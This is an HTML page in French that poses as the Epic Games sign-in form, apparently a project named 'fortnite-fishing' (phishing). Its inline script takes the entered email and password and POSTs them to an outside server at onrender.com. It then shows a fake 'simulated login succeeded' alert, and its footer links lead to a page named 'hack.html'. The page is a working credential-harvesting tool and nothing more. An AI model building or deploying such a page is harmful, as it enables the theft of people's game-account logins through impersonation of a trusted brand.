<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games - Se connecter</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            width: 470px;
            padding: 30px;
            background-color: #202020;
            border-radius: 8px;
        }

        .epic-logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .epic-logo img {
            width: 40px;
        }

        h1 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #cccccc;
        }

        input {
            width: 100%;
            padding: 12px;
            background-color: #303030;
            border: none;
            border-radius: 4px;
            color: white;
            box-sizing: border-box;
        }

        .forgot-password {
            color: #2196F3;
            text-decoration: none;
            font-size: 14px;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #404040;
            border: none;
            border-radius: 4px;
            color: white;
            cursor: pointer;
            margin: 20px 0;
        }

        .separator {
            text-align: center;
            color: #808080;
            margin: 20px 0;
        }

        .social-login {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-bottom: 20px;
        }

        .social-button {
            padding: 10px;
            border-radius: 4px;
            border: none;
            cursor: pointer;
        }

        .show-more {
            text-align: center;
            margin: 20px 0;
        }

        .show-more button {
            background-color: transparent;
            border: none;
            color: white;
            cursor: pointer;
        }

        .footer-links {
            text-align: center;
        }

        .footer-links a {
            color: #2196F3;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="epic-logo">
            <img src="https://pepperhot.github.io/fortnite-fishing/image/epic_game.png" alt="Epic Games">
        </div>
        
        <h1>Se connecter</h1>
        
        <!-- Formulaire pour se connecter -->
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Adresse e-mail</label>
                <input type="email" name="email" id="email" required>
            </div>
        
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" name="password" id="password" required>
            </div>
        
            <button type="submit" class="login-button">Connexion</button>
        </form>
        
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault(); // Empêche l'envoi classique du formulaire
        
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
        
                fetch('https://fortnite-fishing.onrender.com/enregistrer', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email, password })
                })
                .then(res => res.json())
                .then(data => {
                    alert("Connexion simulée avec succès !");
                    console.log(data);
                })
                .catch(err => {
                    console.error("Erreur lors de l'envoi :", err);
                });
            });
        </script>        
        
        
        <div class="show-more">
            <button>Voir plus</button>
        </div>
        
        <div class="footer-links">
            <a href="https://pepperhot.github.io/fortnite-fishing/templates/hack.html">Créer un compte</a><br>
            <a href="https://pepperhot.github.io/fortnite-fishing/templates/hack.html">Politique de confidentialité</a>
        </div>
    </div>
</body>
</html>
